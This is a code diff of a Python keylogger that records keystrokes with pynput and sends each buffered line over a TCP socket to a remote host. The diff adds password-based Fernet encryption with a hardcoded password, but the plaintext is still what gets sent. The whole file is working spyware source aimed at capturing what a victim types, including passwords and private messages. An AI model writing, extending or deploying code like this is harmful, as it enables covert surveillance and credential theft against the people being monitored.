@@ -1,13 +1,35 @@
+import os
+import base64
 from time import sleep
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from pynput.keyboard import Listener,Key
+
 import socket
 
 HOST=''
-PORT=1234
+PORT=12345
 message_container=[]
-
+PASSWORD=b"password"
 sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.connect((HOST,PORT))
+
+def encrpt_message(message):
+    salt = os.urandom(16)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=1200000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
+    fernet = Fernet(key)
+
+    encrypted_message=fernet.encrypt(message.encode())
+    final_message=salt + encrypted_message
+
+    return base64.b64encode(final_message)
 
 def on_press(key):
     try:
@@ -25,8 +47,14 @@ def on_press(key):
             pressed_key ="<shift>"
         elif key == Key.esc:
             pressed_key ="<esc>"
+        elif key == Key.tab:
+            pressed_key ="<tab>"
         elif key == Key.enter:
             message="".join(message_container)
+            encrypted=encrpt_message(message)
+            print(f"Encrypted content : {encrypted.decode()}")
+            # print(f"Enc salt : {enc_msg[:16].hex()}")
+            # print(f"Enc msg : {enc_msg[16:]}")
             sock.sendall(message.encode())
             message_container.clear()
         else:
